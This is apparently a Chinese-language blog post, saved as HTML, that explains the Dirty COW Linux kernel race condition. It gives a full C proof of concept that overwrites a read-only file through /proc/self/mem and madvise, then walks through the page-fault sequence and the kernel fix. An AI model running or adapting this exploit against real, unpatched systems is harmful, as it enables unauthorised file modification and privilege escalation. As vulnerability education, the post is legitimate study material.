@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="1y0ng" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      linux提权之dirtycow 
+      
+      
+      |
+    
+     1y0ng&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon2.png">
+    <link rel="icon" href="/images/favicon2.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="1y0ng's Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/favicon2.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">1y0ng</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/Tool/">
+          <a href="/Tool/">Tool</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">linux提权之dirtycow</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-01-16 09:53:04
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E6%8F%90%E6%9D%83/" title="提权">
+                    #提权
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>Dirty COW（脏牛）漏洞是一种影响Linux操作系统的本地特权升级漏洞，其全称为&quot;Copy-On-Write&quot;（写时复制）漏洞。这个漏洞在2016年被公开，并且影响了大量的Linux内核版本。</p>
+<p>Dirty  COW漏洞的根本原因是<code>Linux在竞态条件下的复制时写入（Copy-On-Write）机制的实现存在缺陷</code>。Copy-On-Write是一种内存管理技术，它允许多个进程共享同一个物理内存页面的副本，直到其中一个进程尝试修改该页面时，系统才会复制出一个新的页面供修改进程使用。</p>
+<p><code>竞态条件（Race Condition）</code>是多个并发操作或线程访问共享资源时可能出现的一种问题。竞态条件发生在多个操作之间存在依赖关系，并且操作的执行顺序会影响最终的结果。</p>
+<p>听起来似乎比较复杂，我们可以简单一点</p>
+<p>假设有一个变量a</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;dirty&quot;</span></span><br></pre></td></tr></table></figure>
+<p>同时还有另一个变量b</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=a</span><br></pre></td></tr></table></figure>
+<p>尽管这是两个变量，但它们都指向同一个内存对象，因为不需要为相同的值占用两倍的内存量。但如果修改了b变量，操作系统就会为这个变量分配单独的内存。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b+=<span class="string">&quot;cow&quot;</span></span><br></pre></td></tr></table></figure>
+<p>修改时，内核执行了一下操作：</p>
+<ol>
+<li>
+<p>为新修改的变量分配内存</p>
+</li>
+<li>
+<p>读取正在复制的对象的原始内容</p>
+</li>
+<li>
+<p>对它执行任何必要的更改，即附加“cow”</p>
+</li>
+<li>
+<p>将修改后的内容写入新分配的内存空间</p>
+</li>
+</ol>
+<p>在步骤 2 和 4 之间存在竞态条件，会使内存映射器将修改后的内容写入原始内存空间，而不是新分配的空间。这样，我们最终会修改 <code>a</code>这个 原始对象而不是  <code>b</code>，即使我们只有  <code>a</code>的只读权限，仍然可以通过竞态条件绕过。</p>
+<p>接下来我们可以通过一个小实验来理解这个过程</p>
+<h1 id="开始实验">开始实验</h1>
+<p>本实验的目标是使用 Dirty Cow 漏洞修改只读文件。</p>
+<p>首先通过root创建一个其他人都只能读的只读文件test.txt</p>
+<p><img src="image-20231223164736506.png" alt="image-20231223164736506"></p>
+<p>接着通过gcc编译一下代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> f=open(<span class="string">&quot;test.txt&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    fstat(f, &amp;st);</span><br><span class="line">    file_size = st.st_size;</span><br><span class="line">    <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>,<span class="string">&quot;dirty&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">    pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *content= <span class="string">&quot;cow&quot;</span>;</span><br><span class="line">    <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line">    <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">        lseek(f, offset, SEEK_SET);</span><br><span class="line">        write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">            madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现文件内容被我们给修改了</p>
+<p><img src="image-20231223181826083.png" alt="image-20231223181826083"></p>
+<h1 id="分析代码">分析代码</h1>
+<p>首先简单看一下主函数代码，在这之前，我们得先了解linux中的Page Cache</p>
+<h2 id="Page-Cache">Page Cache</h2>
+<p>在Linux中，<code>Page Cache（页缓存）</code>是一种用于加速文件系统性能的内核机制。Page Cache是一种缓存，它将磁盘上的文件数据以页的形式缓存在内存中，以便快速响应对文件的读取和写入操作。</p>
+<p>当进程通过系统调用读取文件时，Linux内核会尝试从Page Cache中查找相应的数据。如果数据已经缓存在Page Cache中，内核可以直接将数据返回给进程，避免了从磁盘读取的开销，从而提高读取性能。</p>
+<p>同样地，当进程进行写入操作时，内核会将数据写入Page Cache，并将数据标记为<code>已修改（dirty）</code>。然后，内核会根据一定的策略将这些修改的数据异步地刷新回磁盘，以确保数据持久化。这种延迟写入的方式可以提高写入性能，减少频繁的磁盘IO操作。</p>
+<h2 id="mmap">mmap</h2>
+<p>其中，<code>mmap()</code>是一个系统调用函数，用于在进程的虚拟地址空间中创建一个新的内存映射区域。它可以将文件或其他资源映射到进程的内存中，也可以用于创建匿名的、仅在内存中存在的映射区域。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</span><br></pre></td></tr></table></figure>
+<p><code>mmap()</code>函数接受六个参数：</p>
+<ul>
+<li>
+<p><code>addr</code>：映射区域的首选地址。通常传入<code>NULL</code>，让操作系统自动选择一个合适的地址。</p>
+</li>
+<li>
+<p><code>length</code>：映射区域的长度（以字节为单位）。</p>
+</li>
+<li>
+<p><code>prot</code>：内存保护标志，指定映射区域的访问权限。常见的选项有：<code>PROT_READ</code>：可读。<code>PROT_WRITE</code>：可写。<code>PROT_EXEC</code>：可执行。</p>
+</li>
+<li>
+<p><code>flags</code>：映射选项标志，用于控制映射区域的行为。常见的选项有：</p>
+<ul>
+<li><code>MAP_SHARED</code>：与其他进程共享映射的文件或资源。</li>
+<li><code>MAP_PRIVATE</code>：创建私有的映射区域，对其所做的修改不会影响原始文件或资源。</li>
+<li><code>MAP_ANONYMOUS</code>：创建匿名的映射区域，不与文件关联，仅在内存中存在。</li>
+</ul>
+</li>
+<li>
+<p><code>fd</code>：要映射的文件描述符，如果创建匿名映射，则为-1。</p>
+</li>
+<li>
+<p><code>offset</code>：映射的文件中的偏移量，通常为0。</p>
+</li>
+</ul>
+<p>mmap创建的内存映射就是将磁盘文件的内容放到了Page Cache里。</p>
+<h2 id="主函数">主函数</h2>
+<p>这段代码一共创建了三个线程，主线程、writeThread 和 madviseThread，主线程创建了私有的映射区域并将我们的文件映射到内存，找到我们要替换的内容的位置，然后创建两个线程来产生竞态条件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> pth1, pth2; <span class="comment">// 声明两个线程标识符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span> <span class="comment">// 声明一个stat结构体变量，用于获取文件的状态信息</span></span><br><span class="line">    <span class="type">int</span> file_size; <span class="comment">// 声明一个整数变量，用于存储文件大小</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> f = open(<span class="string">&quot;test.txt&quot;</span>, O_RDONLY); <span class="comment">// 打开一个名为&quot;test.txt&quot;的文件，以只读方式打开，并返回文件描述符</span></span><br><span class="line"></span><br><span class="line">    fstat(f, &amp;st); <span class="comment">// 获取文件的状态信息，将结果存储在st结构体中</span></span><br><span class="line">    file_size = st.st_size; <span class="comment">// 获取文件的大小，赋值给file_size变量</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>); <span class="comment">// 将文件映射到内存中，返回映射区的起始地址，存储在map指针中</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;dirty&quot;</span>); <span class="comment">// 在映射区中搜索字符串&quot;dirty&quot;，返回第一次出现的位置的指针，存储在position指针中</span></span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span> *)file_size); <span class="comment">// 创建一个线程，执行madviseThread函数，并将file_size作为参数传递</span></span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position); <span class="comment">// 创建另一个线程，执行writeThread函数，并将position作为参数传递</span></span><br><span class="line"></span><br><span class="line">    pthread_join(pth1, <span class="literal">NULL</span>); <span class="comment">// 等待线程pth1的结束</span></span><br><span class="line">    pthread_join(pth2, <span class="literal">NULL</span>); <span class="comment">// 等待线程pth2的结束</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="madviseThread">madviseThread</h2>
+<p>然后是madviseThread，在这之前先了解一下madvise函数</p>
+<p><code>madvise()</code>是一个系统调用函数，用于向操作系统提供有关内存映射区域使用方式的提示信息。它的原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">madvise</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> advice)</span>;</span><br></pre></td></tr></table></figure>
+<p><code>madvise()</code>函数接受三个参数：</p>
+<ul>
+<li><code>addr</code>：指向欲操作的内存区域的起始地址。</li>
+<li><code>length</code>：欲操作的内存区域的长度（以字节为单位）。</li>
+<li><code>advice</code>：对内存区域使用方式的提示信息，使用<code>MADV_*</code>常量之一。</li>
+</ul>
+<p><code>madvise()</code>函数的常用选项（<code>advice</code>参数）如下：</p>
+<ul>
+<li>
+<p><code>MADV_NORMAL</code>：默认选项，没有特殊提示。</p>
+</li>
+<li>
+<p><code>MADV_RANDOM</code>：内存区域将以随机访问方式使用。</p>
+</li>
+<li>
+<p><code>MADV_SEQUENTIAL</code>：内存区域将以顺序访问方式使用。</p>
+</li>
+<li>
+<p><code>MADV_WILLNEED</code>：预先告知操作系统，内存区域将很快被使用，建议提前加载至内存。</p>
+</li>
+<li>
+<p><code>MADV_DONTNEED</code>：告知操作系统，内存区域的内容不再需要，可以被丢弃或回收。</p>
+</li>
+<li>
+<p><code>MADV_REMOVE</code>：从内存中删除映射区域，但保留文件内容。</p>
+</li>
+<li>
+<p><code>MADV_DONTFORK</code>：禁止映射区域被子进程继承。</p>
+</li>
+</ul>
+<p>madviseThread函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> file_size = (<span class="type">int</span>)arg; <span class="comment">// 获得传进来的文件大小</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED); <span class="comment">//告诉操作系统，该内存区域的内容不再需要，可以被丢弃或回收</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>madviseThread要干的事非常简单，就是不断丢弃映射内容的副本页，这将导致<code>指向副本页的页表项被清除</code></p>
+<h2 id="writeThread">writeThread</h2>
+<p>再来看看writeThread</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *content = <span class="string">&quot;cow&quot;</span>; <span class="comment">// 要写入内存的内容</span></span><br><span class="line">    <span class="type">off_t</span> offset = (<span class="type">off_t</span>)arg; <span class="comment">// 要写入的内存偏移量，将void指针参数转换为off_t类型</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> f = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR); <span class="comment">// 以可读写方式打开当前进程的内存文件</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 将文件指针移动到之间查找到“dirty”的位置</span></span><br><span class="line">        lseek(f, offset, SEEK_SET);</span><br><span class="line">        <span class="comment">// 向内存写入数据</span></span><br><span class="line">        write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>writeThread</code>函数将指定的内容（“cow”）通过<code>/proc/self/mem</code>写入内存，诶？这里似乎出现了一个问题，我们之前通过mmap返回的内存映射不是只读的吗？那这里对该位置尝试写入能写成功吗？而且就算写成功，写的也是内存映射中的内容，和原来的本地磁盘上的内容有什么联系？不急，我们接着往下看</p>
+<h2 id="缺页中断">缺页中断</h2>
+<p>这里先讲讲linux的缺页中断</p>
+<p>Linux的缺页中断处理方式大致可以分为以下几个步骤：</p>
+<ol>
+<li>中断处理程序（Interrupt Handler）：当发生缺页中断时，CPU会暂停当前进程的执行，并转交控制权给内核的中断处理程序。这个中断处理程序负责保存当前进程的上下文，并进行后续的缺页中断处理。</li>
+<li>查询页表：中断处理程序首先会查询当前进程的页表，以确定引发缺页中断的虚拟地址所对应的页表项。如果页表项不存在或标记为无效，说明该页面尚未映射到物理内存，需要进行页面调入。</li>
+<li>页面调入：当发现虚拟页面尚未映射到物理内存时，内核会触发页面调入操作。它会选择一个物理页面（可能需要从磁盘读取）来存储该虚拟页面的数据，并进行必要的页面映射更新。</li>
+<li>更新页表：页面调入后，内核会更新当前进程的页表，将虚拟地址与物理地址进行映射。这样，进程可以继续访问该页面，而不会再触发缺页中断。</li>
+<li>恢复进程执行：完成页面调入和页表更新后，内核会恢复中断处理程序保存的当前进程上下文，并将控制权返回给进程。进程可以继续执行之前被中断的指令，访问所需的页面。</li>
+</ol>
+<p>了解完之后我们开始分析整个过程（初略的讲一下，具体的代码逻辑可以看<a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/">blingblingxuanxuan的文章</a>）</p>
+<h2 id="第一次缺页中断">第一次缺页中断</h2>
+<p>首先在主函数调用完mmap之后将文件内容以只读的形式映射到了内存中，然而相应的页表还未来得及建立</p>
+<p>writeThread进程通过虚拟地址尝试访问这个页，但页表为空，触发缺页中断，不同的情况有不同的处理方式，而这里发生缺页以后，内核根据根据访问flags（FOLL_WRITE，写请求）和mmap类型（VM_PRIVATE，私有映射区域），在物理内存上将page_cache做了一份拷贝（COW），也就是创建一个新的物理页（称为副本页），然后将原始页的内容拷贝到新的物理页中，并使用副本页建立页表，映射给进程使用（联系到之前的例子，对b进行修改，内核拷贝了一份新的地址给b）。同时标记页表为<code>只读RO</code>和<code>脏页dirty</code></p>
+<h2 id="第二次缺页中断">第二次缺页中断</h2>
+<p>解决完问题，writeThread继续尝试写操作，当查找页表时，发现所请求的页表项被标记为只读（read-only），但是进程试图对该页进行写操作，Linux 的处理方式是将写意图（write intent）去掉，即<code>FOLL_WRITE=0</code>，同时会复制一份新的内存区域，并将这份新的内存区更新到页表中，并将这份新的内存区域的权限设置为可写，内核重新执行引发页面错误的那条指令。</p>
+<p>正常情况下，程序拿到新的页表项找到物理内存就可以开始做写操作了，这个写操作是在新的内存页中操作的，和原来的内存页中无关（类似于修改了b，但和a无关）</p>
+<p>诶！！！好巧不巧，正好此时madviseThread执行到madvice函数，释放了对应的虚拟内存空间，把这个页表的存在位清空了。</p>
+<h2 id="第三次缺页中断">第三次缺页中断</h2>
+<p>之前writeThread本应拿到的页表项被madviseThread给清空了，所以又发生了缺页中断，和第一次一样，只不过这一次由于访问flags（FOLL_WRITE=0），认为没有写意图，就直接返回page cache这个物理内存以建立页表关系，所以writeThread就这样拿到了对应着page cache的页表项，并通过<code>kmap()</code>映射绕过mmap映射的读写限制，完成强制写内存</p>
+<h2 id="page-cache写回">page cache写回</h2>
+<p>page cache的数据标记为已修改（dirty），就会通过page cache写回机制覆盖调原有的磁盘文件，至此，仅可读文件被成功修改。</p>
+<p>上述所有的流程都是只在一次for循环中完成的，过程可参考一下流程图</p>
+<p><img src="image-20231223231058051.png" alt="image-20231223231058051"></p>
+<h1 id="修复">修复</h1>
+<p>linux增加了一个FOLL_COW属性，第二次缺页中断后FOLL_WRITE不会置为0，而是加上一个<code>FOLL_COW</code>的属性，这样第三次的缺页中断FOLL_WRITE依旧等于1</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/">经典内核漏洞复现之 dirtycow</a></p>
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3">条件竞争学习 之 DirtyCow分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-264199.htm#msg_header_h3_6">Linux内核[CVE-2016-5195] (dirty COW)原理分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://tsitsiflora.medium.com/dirty-cow-vulnerability-an-analysis-fdf50243dc6">Dirty Cow Vulnerability: An Analysis</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/2023/msi%E6%9C%A8%E9%A9%AC%E5%88%9B%E5%BB%BA/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-01-16 09:53:04
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E6%8F%90%E6%9D%83/" title="提权">
+                        #提权
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/post/2024/linux%E5%8F%8C%E9%87%8D%E9%87%8A%E6%94%BE%E6%BC%8F%E6%B4%9E/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%AE%9E%E9%AA%8C"><span class="toc-text">开始实验</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="toc-text">分析代码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Page-Cache"><span class="toc-text">Page Cache</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap"><span class="toc-text">mmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E5%87%BD%E6%95%B0"><span class="toc-text">主函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#madviseThread"><span class="toc-text">madviseThread</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#writeThread"><span class="toc-text">writeThread</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD"><span class="toc-text">缺页中断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD"><span class="toc-text">第一次缺页中断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD"><span class="toc-text">第二次缺页中断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AC%A1%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD"><span class="toc-text">第三次缺页中断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#page-cache%E5%86%99%E5%9B%9E"><span class="toc-text">page cache写回</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
